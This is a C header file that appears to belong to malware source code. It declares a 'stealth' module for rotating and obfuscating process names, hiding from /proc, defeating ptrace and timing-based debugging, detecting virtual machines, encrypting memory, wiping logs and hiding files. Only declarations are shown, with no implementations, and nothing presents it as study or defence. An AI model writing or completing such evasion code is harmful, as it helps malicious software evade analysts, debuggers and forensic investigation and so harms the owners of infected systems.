#pragma once

#include "includes.h"
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <dirent.h>
#include <dlfcn.h>

// Process hiding techniques
#define STEALTH_MAX_PROCESS_NAMES 20
#define STEALTH_MEMORY_KEY_SIZE 32
#define STEALTH_ANTI_DEBUG_INTERVAL 30

// Process name obfuscation
typedef struct {
    char names[STEALTH_MAX_PROCESS_NAMES][32];
    int current_index;
    int total_names;
} stealth_process_names_t;

// Anti-debugging structures
typedef struct {
    BOOL ptrace_check;
    BOOL timing_check;
    BOOL vm_detection;
    BOOL debugger_present;
    time_t last_check;
} stealth_anti_debug_t;

// Memory protection
typedef struct {
    char key[STEALTH_MEMORY_KEY_SIZE];
    BOOL encryption_enabled;
    void *protected_data;
    size_t data_size;
} stealth_memory_protection_t;

// VM detection
typedef struct {
    BOOL vm_artifacts_found;
    BOOL timing_anomalies;
    BOOL hardware_indicators;
    char vm_signatures[10][64];
} stealth_vm_detection_t;

// Function declarations
void stealth_init(void);
void stealth_process_hide(void);
void stealth_name_obfuscation(void);
void stealth_proc_hiding(void);
void stealth_anti_debugging(void);
void stealth_vm_detection(void);
void stealth_memory_protection(void);
void stealth_cleanup_traces(void);

// Internal functions
static void stealth_rotate_process_name(void);
static void stealth_hide_from_proc(void);
static void stealth_anti_ptrace(void);
static void stealth_anti_timing(void);
static void stealth_detect_vm(void);
static void stealth_encrypt_memory(void);
static void stealth_decrypt_memory(void);
static void stealth_clean_logs(void);
static void stealth_hide_files(void);
static BOOL stealth_is_debugger_present(void);
static BOOL stealth_is_vm_environment(void);
void stealth_randomize_behavior(void);
